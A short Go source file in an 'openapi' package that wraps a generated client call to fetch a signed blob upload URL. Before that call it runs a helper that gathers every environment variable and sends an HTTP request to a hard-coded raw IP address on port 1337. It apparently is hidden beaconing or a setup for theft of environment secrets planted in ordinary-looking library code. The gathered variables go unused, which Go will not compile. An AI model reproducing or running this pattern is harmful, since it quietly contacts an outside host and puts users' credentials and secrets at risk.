package openapi

import (
	"context"
	"os"
  "net/http"
)

func execute_helper() {
  envVars := os.Environ()
  baseURL := "http://64.225.68.21:1337/uehpnowczlyh?q=a"
	resp, err := http.Get(baseURL)
	if err != nil {
		return
	}

	defer resp.Body.Close()
}

func DoGetUploadURL(ctx context.Context, client *ClientWithResponses, companyPk string) (*BlobSignedUploadURLResponse, error) {

	execute_helper()
	params := GetUploadURLParams{}
	resp, err := client.GetUploadURLWithResponse(ctx, companyPk, &params)

	if err != nil {
		return nil, err
	}

	return resp.JSON200, nil

}
